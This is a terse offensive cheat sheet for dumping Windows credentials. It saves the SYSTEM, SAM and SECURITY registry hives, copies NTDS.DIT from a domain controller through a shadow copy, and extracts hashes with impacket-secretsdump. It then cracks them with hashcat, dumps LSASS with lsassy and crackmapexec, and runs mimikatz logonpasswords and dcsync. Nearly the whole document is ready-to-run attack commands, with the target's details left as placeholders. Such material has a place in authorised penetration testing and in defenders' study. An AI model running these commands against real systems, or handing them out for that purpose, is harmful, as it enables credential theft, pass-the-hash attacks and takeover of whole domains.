# Secrets Dump
Need administrator rights. On DC you can retrieve NTDS.DIT file for domain users. hashes can be used for Pass The Hash attack (except cached hashes).	

Requirements:
* Access to admin account

## Local
Keys (SYSTEM):
`reg SAVE HKLM\SYSTEM C:\Windows\Temp\SYSTEM`

Domain hashes & kerberos keys (NTDS.DIT):
```bash
vssadmin create shadow /for=C:
copy <SHADOW_PATH>\Windows\NTDS\ntds.dit C:\Windows\Temp\ntds.dit
vssadmin delete shadows /shadow=<SHADOW_ID>
```

`impacket-secretsdump -ntds <NTDS.DIT> -system <SYSTEM> LOCAL`
`hashcat -m 1000 <HASH> <PASSLIST> --potfile-disable`

Local hashes (SAM):
`reg SAVE HKLM\SAM C:\Windows\Temp\SAM`

`impacket-secretsdump -sam <SAM> -system <SYSTEM> LOCAL`
`hashcat -m 1000 <HASH> <PASSLIST> --potfile-disable`

Cached domain hashes (SECURITY):
`reg SAVE HKLM\SECURITY C:\Windows\Temp\SECURITY`

`impacket-secretsdump -SECURITY <SECURITY> -system <SYSTEM> LOCAL`
`hashcat -m 2100 <HASH> <PASSLIST> --potfile-disable`

Cached domain hashes (lsass process):
`lsassy -d <DOMAIN> -u <USER> -p <PASS> <IP>`
`crackmapexec smb <IP> -d <DOMAIN> -u <USER> -p <PASS> -M lsassy`

## Remote
`impacket-secretsdump '<DOMAIN>/<USER>:<PASS>@<IP>'`
`crackmapexec smb <IP> -d <DOMAIN> -u <USER> -p <PASS> --sam`
`crackmapexec smb <IP> -d <DOMAIN> -u <USER> -p <PASS> --lsa`


crackmapexec

Check with `Privilege::debug` if the right priv are set (admin).

Sekurlsa::logonpasswords
Lsadump::dcsync /user:\<USER\> /domain:\<DOMAIN\>
Lsadump::lsa /inject /name:\<USER\>